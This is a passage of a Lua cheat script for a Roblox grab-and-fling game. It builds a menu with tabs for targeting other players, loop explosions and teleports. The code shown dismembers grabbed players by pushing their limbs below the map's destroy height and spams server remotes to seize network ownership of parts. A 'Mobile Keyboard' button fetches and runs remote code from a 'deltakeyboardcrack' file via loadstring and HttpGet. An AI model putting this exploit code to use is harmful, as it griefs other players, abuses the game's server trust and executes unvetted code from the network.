    Muted = 'rgb(90,  88, 105)',
    Faint = 'rgb(52,  50,  66)',
    Green = 'rgb(110, 210, 130)',
    Amber = 'rgb(220, 175,  80)',
    Red = 'rgb(215,  75,  75)',
    Blue = 'rgb(110, 165, 240)',
}

function Col(text, colour)
    return ("<font color='%s'>%s</font>"):format(colour, text)
end
function Bold(text)
    return '<b>' .. text .. '</b>'
end
function Sep()
    return Col('\u{2500}\u{2500}\u{2500}\u{2500}\u{2500}\u{2500}\u{2500}\u{2500}\u{2500}\u{2500}\u{2500}\u{2500}\u{2500}\u{2500}\u{2500}\u{2500}\u{2500}\u{2500}\u{2500}\u{2500}', C.Faint)
end
function Row(key, val, valCol)
    return Bold(key) .. Col('   ', C.Faint) .. Col(val, valCol or C.Sub)
end
function Typewrite(label, finalText, speed)
    speed = speed or 0.04

    task.spawn(function()
        local plain = finalText:gsub('<[^>]+>', '')

        for i = 1, #plain do
            label:SetText(plain:sub(1, i))
            task.wait(speed)
        end

        label:SetText(finalText)
    end)
end
function Cascade(fns, gap)
    gap = gap or 0.1

    task.spawn(function()
        for _, f in ipairs(fns)do
            f()
            task.wait(gap)
        end
    end)
end
function FormatUptime(s)
    local h = s // 3600
    local m = (s % 3600) // 60
    local sc = s % 60

    if h > 0 then
        return ('%dh %02dm'):format(h, m)
    elseif m > 0 then
        return ('%dm %02ds'):format(m, sc)
    else
        return sc .. 's'
    end
end

Tabs = {
    HomeTab = Window:AddTab('Home', 'house', 'Overview & Stats'),
    PlayerTab = Window:AddTab('Player', 'user', 'Actions that apply to you'),
    Defence = Window:AddTab('Antis', 'shield', "Anti's that protect you"),
    Target = Window:AddTab('Target', 'sword', 'Loop target other players and all players'),
    Grab = Window:AddTab('Grab', 'hand', 'Customize grab options and interactions'),
    FigureTab = Window:AddTab('Clicker', 'mouse-pointer-click', 'Create and modify poses for players and NPCs'),
    Anchor = Window:AddTab('Anchor', 'anchor', 'Anchor and object control toggles'),
    ExplosionTab = Window:AddTab('Explode', 'bomb', 'Loop explosions and explosion visuals'),
    TpTab = Window:AddTab('Teleport', 'map-pinned', 'Instant teleport and barrier toggles'),
    BHTab = Window:AddTab('Blackhole', 'orbit', 'Blackhole colors and effects'),
    ESP = Window:AddTab('World', 'globe', 'Map visuals, shaders, and world effects'),
    Keybinds = Window:AddTab('Keybinds', 'keyboard', 'Custom keybind toggles'),
    ['UI Settings'] = Window:AddTab('Options', 'cog', 'Themes and menu settings'),
}

local ProfileBox = Tabs.HomeTab:AddLeftGroupbox('Profile', 'user')
local SessionBox = Tabs.HomeTab:AddRightGroupbox('Activity', 'activity')
local QuickBox = Tabs.HomeTab:AddRightGroupbox('Script', 'zap')

task.spawn(function()
    local ok, url = pcall(function()
        return Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.AvatarBust, Enum.ThumbnailSize.Size150x150)
    end)

    if ok and url then
        ProfileBox:AddImage('avatar', {
            Image = url,
            Height = 215,
        })
    end

    task.wait(0.15)

    local nameLabel = ProfileBox:AddLabel('')

    task.wait(0.05)
    Typewrite(nameLabel, Bold(Col(LocalPlayer.Name, C.Text)), 0.055)
    task.wait(#LocalPlayer.Name * 0.055 + 0.1)
    ProfileBox:AddLabel(Col(LocalPlayer.DisplayName, C.Muted))
    task.wait(0.12)
    ProfileBox:AddLabel(Sep())
    task.wait(0.05)
    Cascade({
        function()
            ProfileBox:AddLabel(Row('User ID', tostring(LocalPlayer.UserId)))
        end,
        function()
            ProfileBox:AddLabel(Row('License', 'Lifetime', C.Amber))
        end,
    }, 0.09)
end)
task.spawn(function()
    task.wait(0.3)

    local gameName = 'Unknown Game'

    pcall(function()
        gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name:lower()
    end)

    if #gameName > 24 then
        gameName = gameName:sub(1, 22) .. '\u{2026}'
    end

    local ok1, pc = pcall(function()
        return #Players:GetPlayers()
    end)
    local ok2, mp = pcall(function()
        return Players.MaxPlayers
    end)
    local pop = (ok1 and ok2) and (pc .. ' / ' .. mp) or '\u{2014}'

    Cascade({
        function()
            SessionBox:AddLabel(Row('Game', gameName, C.Blue))
        end,
        function()
            SessionBox:AddLabel(Row('Players', pop))
        end,
    }, 0.09)
    task.wait(0.3)
    SessionBox:AddLabel(Sep())
    task.wait(0.05)

    local uptL = SessionBox:AddLabel(Row('Uptime', '0s'))
    local start = tick()
    local last = -1

    RunService.Heartbeat:Connect(function()
        local s = math.floor(tick() - start)

        if s ~= last then
            last = s

            uptL:SetText(Row('Uptime', FormatUptime(s)))
        end
    end)
    task.wait(0.09)

    local fpsL = SessionBox:AddLabel(Row('FPS', '\u{2014}'))
    local lastT, frames = tick(), 0

    RunService.RenderStepped:Connect(function()
        frames += 1

        local now = tick()

        if now - lastT >= 0.5 then
            local fps = math.floor(frames / (now - lastT))

            frames, lastT = 0, now

            local col = fps >= 60 and C.Green or fps >= 30 and C.Amber or C.Red

            fpsL:SetText(Row('FPS', tostring(fps), col))
        end
    end)
end)
task.spawn(function()
    QuickBox:AddButton({
        Text = Bold('Server Hop'),
        Func = function()
            Library:Notify({
                Description = 'Finding server\u{2026}',
            })

            local ok, raw = pcall(function()
                return game:HttpGet('https://games.roblox.com/v1/games/' .. game.PlaceId .. '/servers/Public?sortOrder=Asc&limit=100')
            end)

            if not ok then
                Library:Notify({
                    Description = 'Request failed.',
                })

                return
            end

            local ok2, data = pcall(function()
                return HttpService:JSONDecode(raw)
            end)

            if not ok2 or not data or not data.data then
                Library:Notify({
                    Description = 'No data returned.',
                })

                return
            end

            local list = {}

            for _, v in ipairs(data.data)do
                if v.id ~= game.JobId and v.playing < v.maxPlayers then
                    table.insert(list, v.id)
                end
            end

            if #list > 0 then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, list[math.random(1, #list)], LocalPlayer)
            else
                Library:Notify({
                    Description = 'No servers found.',
                })
            end
        end,
    })
    QuickBox:AddButton({
        Text = Bold('Rejoin'),
        Func = function()
            Library:Notify({
                Description = 'Rejoining\u{2026}',
            })
            task.wait(0.8)
            TeleportService:Teleport(game.PlaceId, LocalPlayer)
        end,
    })
    QuickBox:AddDivider()
    QuickBox:AddButton({
        Text = Bold('Unload'),
        Func = function()
            task.wait(0.4)
            Library:Unload()
        end,
    })
end)

GUtility = Tabs.Keybinds:AddLeftGroupbox('Mobile Controls', 'smartphone')
Groupbox = Tabs.Keybinds:AddRightGroupbox('Spawn Toys', 'box')
limbBox = Tabs.Keybinds:AddLeftGroupbox('Limb Control', 'scissors')
tpBox = Tabs.Keybinds:AddRightGroupbox('Teleport', 'map-pin')
MiscBox = Tabs.Keybinds:AddLeftGroupbox('Misc', 'settings')

limbBox:AddLabel('Remove Left Leg', false):AddKeyPicker('RemoveLeftLeg', {
    Default = 'None',
    'Remove Left Leg',
    Mode = 'Press',
    Callback = function()
        if workspace:FindFirstChild('GrabParts') and workspace.GrabParts:FindFirstChild('GrabPart') then
            local target = workspace.GrabParts.GrabPart.WeldConstraint.Part1 and workspace.GrabParts.GrabPart.WeldConstraint.Part1.Parent

            if target and target:FindFirstChild('Left Leg') and target:FindFirstChild('Humanoid') and target.Humanoid:FindFirstChild('Ragdolled') then
                if target.Humanoid.Ragdolled.Value then
                    local pos = target.Torso.CFrame

                    workspace.FallenPartsDestroyHeight = -100
                    target['Left Leg'].CFrame = CFrame.new(0, -1E3, 0)

                    task.wait(0.1)

                    target.Torso.CFrame = CFrame.new(0, -950, 0)

                    task.wait(0)

                    target.Torso.CFrame = pos
                else
                    Library:Notify('Target the target')
                end
            end
        else
            Library:Notify('Please grab a target First')
        end
    end,
})
limbBox:AddLabel('Remove Right Leg', false):AddKeyPicker('RemoveRightLeg', {
    Default = 'None',
    Text = 'Remove Right Leg',
    Mode = 'Press',
    Callback = function()
        if workspace:FindFirstChild('GrabParts') and workspace.GrabParts:FindFirstChild('GrabPart') then
            local target = workspace.GrabParts.GrabPart.WeldConstraint.Part1 and workspace.GrabParts.GrabPart.WeldConstraint.Part1.Parent

            if target and target:FindFirstChild('Right Leg') and target:FindFirstChild('Humanoid') and target.Humanoid:FindFirstChild('Ragdolled') then
                if target.Humanoid.Ragdolled.Value then
                    local pos = target.Torso.CFrame

                    workspace.FallenPartsDestroyHeight = -100
                    target['Right Leg'].CFrame = CFrame.new(0, -1E3, 0)

                    task.wait(0.1)

                    target.Torso.CFrame = CFrame.new(0, -950, 0)

                    task.wait(0)

                    target.Torso.CFrame = pos
                else
                    Library:Notify('Target the target')
                end
            end
        else
            Library:Notify('Please grab a target First')
        end
    end,
})
limbBox:AddLabel('Remove Left Arm', false):AddKeyPicker('RemoveLeftArm', {
    Default = 'None',
    Text = 'Remove Left Arm',
    Mode = 'Press',
    Callback = function()
        if workspace:FindFirstChild('GrabParts') and workspace.GrabParts:FindFirstChild('GrabPart') then
            local target = workspace.GrabParts.GrabPart.WeldConstraint.Part1 and workspace.GrabParts.GrabPart.WeldConstraint.Part1.Parent

            if target and target:FindFirstChild('Left Arm') and target:FindFirstChild('Humanoid') and target.Humanoid:FindFirstChild('Ragdolled') then
                if target.Humanoid.Ragdolled.Value then
                    local pos = target.Torso.CFrame

                    workspace.FallenPartsDestroyHeight = -100
                    target['Left Arm'].CFrame = CFrame.new(0, -1E3, 0)

                    task.wait(0.1)

                    target.Torso.CFrame = CFrame.new(0, -950, 0)

                    task.wait(0)

                    target.Torso.CFrame = pos
                else
                    Library:Notify('Target the target')
                end
            end
        else
            Library:Notify('Please grab a target First')
        end
    end,
})
limbBox:AddLabel('Remove Right Arm', false):AddKeyPicker('RemoveRightArm', {
    Default = 'None',
    Text = 'Remove Right Arm',
    Mode = 'Press',
    Callback = function()
        if workspace:FindFirstChild('GrabParts') and workspace.GrabParts:FindFirstChild('GrabPart') then
            local target = workspace.GrabParts.GrabPart.WeldConstraint.Part1 and workspace.GrabParts.GrabPart.WeldConstraint.Part1.Parent

            if target and target:FindFirstChild('Right Arm') and target:FindFirstChild('Humanoid') and target.Humanoid:FindFirstChild('Ragdolled') then
                if target.Humanoid.Ragdolled.Value then
                    local pos = target.Torso.CFrame

                    workspace.FallenPartsDestroyHeight = -100
                    target['Right Arm'].CFrame = CFrame.new(0, -1E3, 0)

                    task.wait(0.1)

                    target.Torso.CFrame = CFrame.new(0, -950, 0)

                    task.wait(0)

                    target.Torso.CFrame = pos
                else
                    Library:Notify('Target the target')
                end
            end
        else
            Library:Notify('Please grab a target First')
        end
    end,
})

TPConfig = {
    Enabled = true,
    HeightOffset = 3,
    Mode = 'Instant',
    TweenTime = 0.4,
    EasingStyle = Enum.EasingStyle.Quad,
    EasingDirection = Enum.EasingDirection.Out,
    FOVKick = 10,
    FOVReturnTime = 0.25,
    MaxDistance = 0,
    MinYThreshold = -500,
    DisableCollision = true,
    BlinkColor = Color3.fromRGB(255, 255, 255),
    BlinkFadeTime = 0.15,
}
tpBusy = false
zoomActive = false
zoomLevel = 10

function setCharCollision(state)
    if not character then
        return
    end

    for _, p in ipairs(character:GetDescendants())do
        if p:IsA('BasePart') then
            p.CanCollide = state
        end
    end
end
function kickFOV()
    if TPConfig.FOVKick == 0 then
        return
    end

    local orig = cam.FieldOfView

    cam.FieldOfView = orig + TPConfig.FOVKick

    TweenService:Create(cam, TweenInfo.new(TPConfig.FOVReturnTime, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {FieldOfView = orig}):Play()
end
function getTPDest()
    if not mouse.Target then
        return nil
    end

    local y = mouse.Hit.Y

    if y < TPConfig.MinYThreshold then
        return nil
    end

    local dest = Vector3.new(mouse.Hit.X, y + TPConfig.HeightOffset, mouse.Hit.Z)

    if TPConfig.MaxDistance > 0 and humanoidRootPart then
        if (humanoidRootPart.Position - dest).Magnitude > TPConfig.MaxDistance then
            notify('Too far! Max: ' .. TPConfig.MaxDistance .. ' studs')

            return nil
        end
    end

    return dest
end
function tpInstant(dest)
    if not humanoidRootPart then
        return
    end

    humanoidRootPart.CFrame = CFrame.new(dest)

    kickFOV()
end
function tpF()
    if not TPConfig.Enabled then
        return
    end

    local dest = getTPDest()

    if not dest then
        return
    end
    if TPConfig.Mode == 'Instant' then
        tpInstant(dest)
    else
        tpInstant(dest)
    end
end

local tpKeyCode = Enum.KeyCode.T

UserInputService.InputChanged:Connect(function(input, gpe)
    if gpe then
        return
    end
    if not zoomActive then
        return
    end
    if input.UserInputType == Enum.UserInputType.MouseWheel then
        zoomLevel = math.clamp(zoomLevel - input.Position.Z * 2, 0, 100)
        plr.CameraMinZoomDistance = zoomLevel
        plr.CameraMaxZoomDistance = zoomLevel
    end
end)
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then
        return
    end
    if input.KeyCode == tpKeyCode then
        zoomActive = true

        tpF()
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.KeyCode == tpKeyCode then
        zoomActive = false
    end
end)
tpBox:AddCheckbox('TP_Enabled', {
    Text = 'Enable Teleport',
    Default = false,
    Callback = function(val)
        TPConfig.Enabled = val
    end,
})
tpBox:AddLabel('Teleport Key'):AddKeyPicker('TP_Keybind', {
    Default = 'T',
    Text = 'Teleport',
    Mode = 'Press',
    Callback = function()
        tpF()
    end,
})
tpBox:AddDropdown('TP_Mode', {
    Text = 'Mode',
    Default = 'Instant',
    Values = {
        'Instant',
        'Slide',
    },
    Callback = function(val)
        TPConfig.Mode = val
    end,
})
tpBox:AddSlider('TP_HeightOffset', {
    Text = 'Height Offset',
    Default = 3,
    Min = 0,
    Max = 20,
    Rounding = 1,
    Callback = function(val)
        TPConfig.HeightOffset = val
    end,
})
tpBox:AddLabel('TP to Spawn'):AddKeyPicker('TP_ToSpawn', {
    Default = 'None',
    Text = 'TP To Spawn',
    Mode = 'Press',
    Callback = function()
        if humanoidRootPart then
            humanoidRootPart.CFrame = CFrame.new(0, -5, 0)
        end
    end,
})
tpBox:AddLabel('Loop TP Toggle'):AddKeyPicker('TP_LoopToggle', {
    Default = 'None',
    Text = 'Loop TP Toggle',
    Mode = 'Toggle',
    Callback = function(v)
        if Toggles.LoopTpToggle then
            Toggles.LoopTpToggle:SetValue(v)
        end
    end,
})
MiscBox:AddLabel('Break Barrier'):AddKeyPicker('BarrierKey', {
    Default = 'None',
    Text = 'Break Barrier',
    Mode = 'Press',
    Callback = function()
        checkPlotAndFarm()
    end,
})
MiscBox:AddLabel('Destroy Blob (Target)'):AddKeyPicker('DestroyBlobKey', {
    Default = 'None',
    Text = 'Destroy Target Blob',
    Mode = 'Toggle',
    Callback = function(v)
        if Toggles.AutoBlobmanToggle then
            Toggles.AutoBlobmanToggle:SetValue(v)
        end
    end,
})
GUtility:AddButton('MobileKeyboard', {
    Text = 'Mobile Keyboard',
    Func = function()
        if not _G.MobileKeyboardLoaded then
            _G.MobileKeyboardLoaded = true

            loadstring(game:HttpGet('https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt', true))()
        end
    end,
})

Players = game:GetService('Players')
ReplicatedStorage = game:GetService('ReplicatedStorage')
ContextActionService = game:GetService('ContextActionService')
LocalPlayer = Players.LocalPlayer
SpawnToyRF = ReplicatedStorage:WaitForChild('MenuToys'):WaitForChild('SpawnToyRemoteFunction')
ToyFriendlyNames = {
    PalletLightBrown = 'Pallet',
    BallSnowball = 'Snowball',
    BombBalloon = 'Balloon Bomb',
    BombDarkMatter = 'Dark Matter Bomb',
    BombMissile = 'Missile',
    ArmChairBlue = 'Armchair (Blue)',
    ArmChairBrownGray = 'Armchair (Brown/Gray)',
    ArmChairDarkGray = 'Armchair (Dark Gray)',
    ArmChairLightBrownGray = 'Armchair (Light Brown)',
    ArmChairPink = 'Armchair (Pink)',
    ArmChairWhite = 'Armchair (White)',
    BathroomShower = 'Shower',
    BathroomSink = 'Sink',
    BedBlanketBlue = 'Bed (Blue)',
    BedFramedOrange = 'Bed (Orange)',
    BedFuton = 'Futon',
    ChildrensChair = 'Kids Chair',
    ChildrensCouch = 'Kids Couch',
    ChildrensDesk = 'Kids Desk',
    ChildrensShelf = 'Kids Shelf',
    ChildrensTable = 'Kids Table',
    ChildrensTableBench = 'Kids Table Bench',
    ChildrensTableBenchSmall = 'Kids Bench (Small)',
    ClockAlarm = 'Alarm Clock',
    ComputerLaptopOld = 'Old Laptop',
    CouchBlue = 'Couch (Blue)',
    CouchBrownGray = 'Couch (Brown/Gray)',
    CouchDarkGray = 'Couch (Dark Gray)',
    CouchLightBrownGray = 'Couch (Light Brown)',
    CouchPink = 'Couch (Pink)',
    CouchWhite = 'Couch (White)',
    CounterCorner = 'Counter (Corner)',
    CounterSink = 'Counter (Sink)',
    CounterStraight = 'Counter (Straight)',
    FactoryBench = 'Factory Bench',
    FactoryCabinet = 'Factory Cabinet',
    FactoryChair = 'Factory Chair',
    FactoryCouch = 'Factory Couch',
    FactoryDesk = 'Factory Desk',
    FactoryDeskMini = 'Factory Mini Desk',
    FactoryLight = 'Factory Light',
    FactoryShelf = 'Factory Shelf',
    FactoryTable = 'Factory Table',
    FanElectricLittle = 'Electric Fan',
    FanPaper = 'Paper Fan',
    FridgeBlack = 'Fridge (Black)',
    FutureAngularDesk = 'Futuristic Desk',
    JukeboxBlue = 'Jukebox (Blue)',
    JukeboxOrange = 'Jukebox (Orange)',
    JapaneseBanner = 'Japanese Banner',
    JapaneseBench = 'Japanese Bench',
    JapaneseChair = 'Japanese Chair',
    JapaneseCouch = 'Japanese Couch',
    JapaneseDeskMini = 'Japanese Mini Desk',
    JapaneseDresser = 'Japanese Dresser',
    JapaneseLantern = 'Japanese Lantern',
    JapaneseShelf = 'Japanese Shelf',
    JapaneseTable = 'Japanese Table',
    LadderLightBrown = 'Ladder',
    LightLampGray = 'Floor Lamp',
    MachineWasher = 'Washing Machine',
    NormalBench = 'Bench',
    NormalDesk = 'Desk',
    NormalCabinet = 'Cabinet',
    NormalShelves = 'Shelves',
    OvenBlack = 'Oven (Black)',
    OvenDarkGray = 'Oven (Dark Gray)',
    OvenLightGray = 'Oven (Light Gray)',
    OvenMicrowaveWhite = 'Microwave',
    OvenRusty = 'Rusty Oven',
    PlantPottedBonsai = 'Bonsai',
    PlantPottedCactus = 'Cactus',
    PlantPottedTree = 'Potted Tree',
    PlantPottedTreeChristmas = 'Christmas Tree',
    RedGateGong = 'Gong',
    SpookyBench = 'Spooky Bench',
    SpookyCabinet = 'Spooky Cabinet',
    SpookyChair = 'Spooky Chair',
    SpookyCouch = 'Spooky Couch',
    SpookyDesk = 'Spooky Desk',
    SpookyStool = 'Spooky Stool',
    SpookyShelf = 'Spooky Shelf',
    SpookyTable = 'Spooky Table',
    TableLunchTable = 'Lunch Table',
    TableSmallLabTable = 'Lab Table',
    TableWoodFourLegsBrown = 'Wood Table (4 Legs)',
    TableWoodTwoLegs = 'Wood Table (2 Legs)',
    TelevisionFlatscreen = 'Flatscreen TV',
    TelevisionGray = 'Old TV',
    ToiletGold = 'Toilet (Gold)',
    ToiletWhite = 'Toilet (White)',
    Airhorn = 'Airhorn',
    Boombox = 'Boombox',
    BubbleBlower = 'Bubble Blower',
    BucketPaint = 'Paint Bucket',
    Campfire = 'Campfire',
    CreatureBlobman = 'Blobman',
    CreatureRobot = 'Robot',
    DiscoColorBall = 'Disco Ball',
    FireExtinguisher = 'Fire Extinguisher',
    FireworkSmokeBomb = 'Smoke Bomb',
    FireworkMissile = 'Firework Missile',
    FireworkSparkler = 'Sparkler',
    FloatingIsland = 'Floating Island',
    FlyingToyHelicopter = 'Helicopter',
    FlyingToyPlane = 'Plane',
    FlyingToyUfo = 'UFO',
    FoodHotSauce = 'Hot Sauce',
    InstrumentBrassBugle = 'Bugle',
    InstrumentBrassTrumpet = 'Trumpet',
    InstrumentBrassVuvuzela = 'Vuvuzela',
    InstrumentDrumBongos = 'Bongos',
    InstrumentDrumSnare = 'Snare Drum',
    InstrumentGuitarAcoustic = 'Acoustic Guitar',
    InstrumentGuitarBanjo = 'Banjo',
    InstrumentGuitarLyre = 'Lyre',
    InstrumentGuitarUkulele = 'Ukulele',
    InstrumentGuitarViolin = 'Violin',
    InstrumentPianoKeyboard = 'Piano Keyboard',
    InstrumentPianoMelodica = 'Melodica',
    InstrumentVoiceMicrophone = 'Microphone',
    InstrumentWoodwindOcarina = 'Ocarina',
    InstrumentWoodwindSaxophone = 'Saxophone',
    MidiMaker = 'MIDI Maker',
    MusicKeyboard = 'Music Keyboard',
    NinjaKatana = 'Katana',
    NinjaKunai = 'Kunai',
    NinjaShuriken = 'Shuriken',
    NpcRobloxianMascot = 'Robloxian Mascot',
    PaperPlane = 'Paper Plane',
    PetSnowman = 'Snowman',
    PetTurkeyLeg = 'Turkey Leg',
    PlayhouseGingerbread = 'Gingerbread House',
    PresentBig = 'Big Present',
    PresentSmall = 'Small Present',
    SantaSleigh = "Santa's Sleigh",
    SoundWaveMaker = 'Sound Wave Maker',
    SprayCanWD = 'Spray Can',
    ToolCleaver = 'Cleaver',
    ToolDiggingForkRusty = 'Rusty Fork',
    ToolPencil = 'Pencil',
    ToolPickaxe = 'Pickaxe',
    TractorGreen = 'Tractor (Green)',
    TractorOrange = 'Tractor (Orange)',
    TractorRed = 'Tractor (Red)',
    YouDecoy = 'Decoy',
    YouLittle = 'Mini Me',
    AnvilGray = 'Anvil',
    BallBasketball = 'Basketball',
    BellBig = 'Big Bell',
    BellSmall = 'Small Bell',
    BookNormal = 'Book',
    BookManyPages = 'Big Book',
    BoxCrateWood = 'Wooden Crate',
    DiceBig = 'Big Dice',
    DiceSmall = 'Small Dice',
    DrawerLightBrown = 'Drawer',
    FlagUnitedStatesOfAmerica = 'USA Flag',
    FoodPlate = 'Plate',
    GlassBoxGray = 'Glass Box',
    HayBale = 'Hay Bale',
    MineralDiamond = 'Diamond',
    MineralCrystalPink = 'Pink Crystal',
    MineralIngotGold = 'Gold Ingot',
    PoopPile = 'Poop',
    PoopPileSparkle = 'Sparkle Poop',
    RollerGrayPurple = 'Roller',
    Snowflake = 'Snowflake',
    TeapotUtah = 'Teapot',
    TetracubeI = 'Tetracube I',
    TetracubeJ = 'Tetracube J',
    TetracubeL = 'Tetracube L',
    TetracubeO = 'Tetracube O',
    TetracubeS = 'Tetracube S',
    TetracubeT = 'Tetracube T',
    TetracubeZ = 'Tetracube Z',
    ToyAnimalBear = 'Bear',
    ToyAnimalDuck = 'Duck',
    ToyAnimalFrog = 'Frog',
    ToyAnimalTiger = 'Tiger',
    ToyAnimalUnicorn = 'Unicorn',
    YouFigurine = 'Figurine',
    BallMagicLight = 'Magic Light Ball',
    LightLampDeskLampBent = 'Desk Lamp',
    SpotlightBlue = 'Spotlight (Blue)',
    SpotlightCyan = 'Spotlight (Cyan)',
    SpotlightCyanBlue = 'Spotlight (Cyan/Blue)',
    SpotlightCyanGreen = 'Spotlight (Cyan/Green)',
    SpotlightGreen = 'Spotlight (Green)',
    SpotlightMagenta = 'Spotlight (Magenta)',
    SpotlightRed = 'Spotlight (Red)',
    SpotlightWhite = 'Spotlight (White)',
    SpotlightYellow = 'Spotlight (Yellow)',
    SpotlightYellowGreen = 'Spotlight (Yellow/Green)',
    SpotlightYellowRed = 'Spotlight (Yellow/Red)',
    SpookyCandle1 = 'Candle (x1)',
    SpookyCandle3 = 'Candle (x3)',
    SpookyCandle5 = 'Candle (x5)',
    CupMugBrown = 'Mug (Brown)',
    CupMugWhite = 'Mug (White)',
    FoodBanana = 'Banana',
    FoodBread = 'Bread',
    FoodBroccoli = 'Broccoli',
    FoodCakePink = 'Pink Cake',
    FoodCoconut = 'Coconut',
    FoodDippyEgg = 'Dippy Egg',
    FoodDonut = 'Donut',
    FoodFrenchFries = 'French Fries',
    FoodHamburger = 'Burger',
    FoodHotdog = 'Hotdog',
    FoodMayonnaise = 'Mayo',
    FoodMeatStick = 'Meat Stick',
    FoodMushroomPoison = 'Poison Mushroom',
    FoodPizzaCheese = 'Cheese Pizza',
    FoodPizzaPepperoni = 'Pepperoni Pizza',
    FoodSodaCan = 'Soda Can',
}
ToyDropdownValues = {}
DisplayToInternal = {}

for internalName, displayName in pairs(ToyFriendlyNames)do
    table.insert(ToyDropdownValues, displayName)

    DisplayToInternal[displayName] = internalName
end

table.sort(ToyDropdownValues)

SelectedToy = 'PalletLightBrown'

function SpawnSelectedToy()
    local Character = LocalPlayer.Character

    if not Character then
        return
    end

    local CamPart = Character:FindFirstChild('CamPart')

    if not CamPart then
        return
    end

    SpawnToyRF:InvokeServer(SelectedToy, CamPart.CFrame, Vector3.new(0, CamPart.Orientation.Y, 0))
end

local SpawnToyToggle = Groupbox:AddCheckbox('SpawnToyToggle', {
    Text = 'Spawn Toy',
    Default = false,
})

Groupbox:AddDropdown('SpawnToyDropdown', {
    Values = ToyDropdownValues,
    Default = ToyFriendlyNames[SelectedToy],
    Searchable = true,
    Multi = false,
    Text = 'Selected Toy',
})
Options.SpawnToyDropdown:OnChanged(function(Value)
    SelectedToy = DisplayToInternal[Value]
end)

local SpawnToyKeybind = SpawnToyToggle:AddKeyPicker('SpawnToyKeybind', {
    Default = 'Tab',
    Text = 'Spawn Keybind',
    Mode = 'Toggle',
    Callback = function()
        if not Toggles.SpawnToyToggle.Value then
            return
        end

        SpawnSelectedToy()
    end,
})

SpawnToyKeybind:OnChanged(function()
    print('Spawn keybind changed to:', SpawnToyKeybind.Value)
end)
Toggles.SpawnToyToggle:OnChanged(function(State)
    print('Spawn Toy Toggle:', State)
end)

Config = {
    Notify = {
        Title = '<b>UNSTABLE</b>',
        DedupeWindowSec = 3,
        GlobalCooldownSec = 0.25,
        PerKeyCooldownSec = 4,
        DefaultTime = 2.5,
    },
    Ownership = {
        MaxRetries = 30,
        RetryDelayBase = 0.03,
        RetryDelayMax = 0.2,
        FiresPerAttempt = 15,
        FireInterval = 0.006,
        PostFireWait = 0.07,
        ClaimTimeoutSec = 12,
        PreWarmFires = 25,
        PreWarmInterval = 0.008,
        PreWarmSettle = 0.2,
    },
    Aura = {
        SpawnOffsetY = 15,
        SpawnOffsetX = 4,
        SpawnSettleTime = 0.7,
        RespawnCooldownSec = 2.5,
        MaxRespawnAttempts = 4,
    },
    Queue = {MaxPending = 50},
    Log = {
        Enabled = true,
        Level = 'INFO',
        Prefix = '[<b>UNSTABLE</b>]',
    },
    Debug = {LogOwnershipSteps = false},
}
LOG_LEVELS = {
    DEBUG = 1,
    INFO = 2,
    WARN = 3,
    ERROR = 4,
}

function LogWrite(level, msg, ...)
    if not Config.Log.Enabled then
        return
    end
    if (LOG_LEVELS[level] or 0) < (LOG_LEVELS[Config.Log.Level] or 0) then
        return
    end

    local s = Config.Log.Prefix .. ' [' .. level .. '] ' .. tostring(msg)

    if select('#', ...) > 0 then
        local ok, r = pcall(string.format, s, ...)

        s = ok and r or (s .. ' ' .. table.concat({...}, ' '))
    end

    print(s)
end
function LogDebug(m, ...)
    LogWrite('DEBUG', m, ...)
end
function LogInfo(m, ...)
    LogWrite('INFO', m, ...)
end
function LogWarn(m, ...)
    LogWrite('WARN', m, ...)
end
function LogError(m, ...)
    LogWrite('ERROR', m, ...)
end

NotifyLastGlobal = 0
NotifyKeyCooldowns = {}
NotifyDedupeCache = {}

function NotifyHash(desc)
    return tostring(desc or '')
end
function NotifyCanEmit(key, h)
    local now = tick()

    if (now - NotifyLastGlobal) < Config.Notify.GlobalCooldownSec then
        return false
    end
    if (now - (NotifyDedupeCache[h] or 0)) < Config.Notify.DedupeWindowSec then
        return false
    end
    if (now - (NotifyKeyCooldowns[key] or 0)) < Config.Notify.PerKeyCooldownSec then
        return false
    end

    return true
end
function NotifySend(desc, time, key)
    local h = NotifyHash(desc)

    key = key or h

    if not NotifyCanEmit(key, h) then
        return
    end

    local now = tick()

    NotifyLastGlobal = now
    NotifyKeyCooldowns[key] = now
    NotifyDedupeCache[h] = now

    LogInfo('Notify: %s', tostring(desc))
    Library:Notify({
        Title = Config.Notify.Title,
        Description = desc,
        Time = time or Config.Notify.DefaultTime,
    })
end

QueuePending = {}
QueueRunning = false

function QueueDrain()
    if QueueRunning then
        return
    end

    QueueRunning = true

    task.spawn(function()
        while#QueuePending > 0 do
            local entry = table.remove(QueuePending, 1)
            local fn = type(entry) == 'table' and entry._fn or entry
            local ok, err = pcall(fn)

            if not ok then
                LogError('Queue: %s', tostring(err))
            end

            task.wait()
        end

        QueueRunning = false
    end)
end
function QueuePush(fn)
    if #QueuePending >= Config.Queue.MaxPending then
        LogWarn('Queue full, discarding task')

        return
    end

    table.insert(QueuePending, fn)
    QueueDrain()
end
function QueuePushUnique(id, fn)
    local i = 1

    while i <= #QueuePending do
        local t = QueuePending[i]

        if type(t) == 'table' and t._id == id then
            table.remove(QueuePending, i)
        else
            i = i + 1
        end
    end

    table.insert(QueuePending, {
        _id = id,
        _fn = fn,
    })
    QueueDrain()
end

OwnerInFlight = {}

function OwnerReset()
    OwnerInFlight = {}
end
function OwnerPartId(part)
    return tostring(part)
end
function OwnerIsOwned(part)
    if not part or not part.Parent then
        return false
    end

    local po = part:FindFirstChild('PartOwner')

    return po ~= nil and po.Value == plr.Name
end
function OwnerFireOnce(part)
    if not part or not part.Parent then
        return
    end

    pcall(function()
        SetNetOwner:FireServer(part, part.CFrame)
        CreateLine:FireServer(part, Vector3.zero, part.Position, false)
    end)
end
function OwnerPreWarm(part, extraFires)
    if not part or not part.Parent then
        return
    end

    local cfg = Config.Ownership
    local fires = extraFires or cfg.PreWarmFires

    LogDebug('OwnerPreWarm: %s fires=%d', OwnerPartId(part), fires)

    for _ = 1, fires do
        if not part or not part.Parent then
            break
        end

        OwnerFireOnce(part)
        task.wait(cfg.PreWarmInterval)
    end

    task.wait(cfg.PreWarmSettle)
end
function OwnerDoClaim(part, resolve)
    local cfg = Config.Ownership
    local id = OwnerPartId(part)
    local startT = tick()

    if OwnerInFlight[id] then
